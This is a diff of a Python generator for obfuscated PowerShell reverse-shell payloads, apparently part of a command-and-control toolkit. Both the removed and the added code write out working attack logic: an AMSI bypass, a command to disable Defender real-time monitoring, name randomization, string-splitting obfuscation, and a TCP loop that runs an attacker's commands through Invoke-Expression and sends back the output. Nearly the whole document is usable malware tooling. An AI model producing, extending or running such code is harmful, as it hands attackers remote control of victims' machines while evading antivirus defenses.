@@ -3,82 +3,50 @@ import string
 import os
 from datetime import datetime
 
-# Ensure payload directory exists
-os.makedirs(os.path.join("server", "payloads"), exist_ok=True)
-
 def rand_name(length=8):
     return ''.join(random.choices(string.ascii_letters, k=length))
-# make sure to change the ip to your c2 or handler ip.
 
-def generate_polymorphic_ps(host="localhost", port=1443, evasion_enabled=False):
-    folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
-    os.makedirs(folder, exist_ok=True)
+def split_string(s):
+    # Splits a string into a "+"-joined sequence of chars for obfuscation
+    return '+'.join([f"\'{c}\'" for c in s])
 
-    filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
-    path = os.path.join(folder, filename)
-
-    v = {key: rand_name() for key in [
-        "main", "client", "stream", "reader", "writer", "cmd", "resp", "iex"
+def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
+    # Randomized variable names
+    var = {k: rand_name(random.randint(5, 10)) for k in [
+        "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback", "sendback2", "sendbyte", "encoding"
     ]}
 
-    # --- Evasion Blocks ---
-    amsi_bypass = """
-$A='System.Management.Automation.AmsiUtils';
-$B=[Ref].Assembly.GetType($A);
-$B.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    """.strip()
+    # AMSI bypass with randomized names
+    amsi_bypass = f"""${var['amsi_type']} = {split_string('AMSI')};
+${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}${var['amsi_type']}+{split_string('Utils')});
+${var['amsi_failed']} = ${var['amsi_field']}.GetField(${var['amsi_type']}+{split_string('InitFailed')},'NonPublic,Static');
+${var['amsi_failed']}.SetValue($null,$true);"""
 
-    # ETW bypass example (can be replaced with better/obfuscated variant)
-    etw_bypass = """
-try {
-    [System.Reflection.Assembly]::Load([Convert]::FromBase64String(
-    '...')) | Out-Null
-} catch {}
-    """.strip()
+    # Reverse shell payload with split and randomized names
+    ps = f"""
+{amsi_bypass}
 
-    defender_disable = """
-try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-} catch {}
-    """.strip()
-
-    evasion_code = ""
-    if evasion_enabled:
-        evasion_code = "\n".join([amsi_bypass, etw_bypass, defender_disable])
-
-    ps = f'''
-{evasion_code}
-
-Function {v["main"]} {{
-    ${v["client"]} = New-Object System.Net.Sockets.TcpClient
-    try {{
-        ${v["client"]}.Connect('{host}', {port})
-    }} catch {{
-        return
-    }}
-
-    ${v["stream"]} = ${v["client"]}.GetStream()
-    ${v["reader"]} = New-Object System.IO.StreamReader(${v["stream"]})
-    ${v["writer"]} = New-Object System.IO.StreamWriter(${v["stream"]})
-    ${v["writer"]}.AutoFlush = $true
-    ${v["iex"]} = ([char]73)+([char]110)+([char]118)+([char]111)+([char]107)+([char]101)+([char]45)+([char]69)+([char]120)+([char]112)+([char]114)+([char]101)+([char]115)+([char]115)+([char]105)+([char]111)+([char]110)
-
-    while ($true) {{
-        ${v["cmd"]} = ${v["reader"]}.ReadLine()
-        if (-not ${v["cmd"]}) {{ continue }}
-        try {{
-            ${v["resp"]} = &${v["iex"]} ${v["cmd"]} 2>&1 | Out-String
-        }} catch {{
-            ${v["resp"]} = "ERROR: $_"
-        }}
-        ${v["resp"]} += "`nPS " + (pwd).Path + "> "
-        ${v["writer"]}.WriteLine(${v["resp"]})
-    }}
+${var['tcpclient']} = New-Object ({split_string('System.Net.Sockets.TCPClient')})('{host}', {port});
+${var['stream']} = ${var['tcpclient']}.GetStream();
+${var['bytes']} = 0..65535|%{{0}};
+while((${var['i']} = ${var['stream']}.Read(${var['bytes']},0,${var['bytes']}.Length)) -ne 0){{
+    ${var['data']} = (New-Object -TypeName ({split_string('System.Text.ASCIIEncoding')})).GetString(${var['bytes']},0,${var['i']});
+    ${var['sendback']} = (iex ${var['data']} 2>&1 | Out-String );
+    ${var['sendback2']} = ${var['sendback']} + "PS " + (pwd).Path + "> ";
+    ${var['sendbyte']} = ([text.encoding]::ASCII).GetBytes(${var['sendback2']});
+    ${var['stream']}.Write(${var['sendbyte']},0,${var['sendbyte']}.Length);
+    ${var['stream']}.Flush();
 }}
-{v["main"]}
-'''.strip()
+""".strip()
 
-    with open(path, 'w') as f:
-        f.write(ps)
-
-    return filename
+    if write_file:
+        # Ensure payload directory exists
+        folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
+        os.makedirs(folder, exist_ok=True)
+        filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
+        path = os.path.join(folder, filename)
+        with open(path, 'w') as f:
+            f.write(ps)
+        return filename
+    else:
+        return ps
